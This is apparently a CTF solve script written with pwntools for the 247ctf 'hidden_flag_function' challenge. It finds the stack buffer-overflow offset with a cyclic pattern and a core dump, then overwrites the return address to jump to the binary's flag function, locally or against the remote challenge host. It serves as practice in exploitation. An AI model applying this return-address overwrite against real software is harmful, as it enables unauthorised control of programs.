#!/usr/bin/env python3

"""
Toast's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./hidden_flag_function")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

CYCLIC_BYTES = 1000

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('40b14b3351586e58.247ctf.com', 50175)

    else:
        io = process([exe.path])

    return io


def main():
    '''Return the flag.
    '''

    offset = get_offset()
    send_payload(offset)


def get_offset():
    '''Get the offset'''

    if args.get('REMOTE'):
        return 76       # Offset from char buffer to the return address

    with conn() as io:
        pat = cyclic(CYCLIC_BYTES, n=4)
        io.sendlineafter(b"What do you have to say?", pat)
        # Program will crash and output coredump
        io.wait()
        core = io.corefile
        offset_addr = core.fault_addr
        log.info(f"ADDR:{offset_addr}")

        offset = cyclic_find(offset_addr, n=4)
        log.info(f"OFFSET:{offset}")
        return offset


def send_payload(offset):
    '''Send offset payload with flag function address'''
    with conn() as io:
        flag_func = p32(exe.symbols['flag'], endian='little')
        log.info(f"{flag_func}")
        payload = fit({
            offset:flag_func
        })

        io.sendlineafter(b"What do you have to say?", payload)
        io.interactive()

if __name__ == '__main__':
    main()
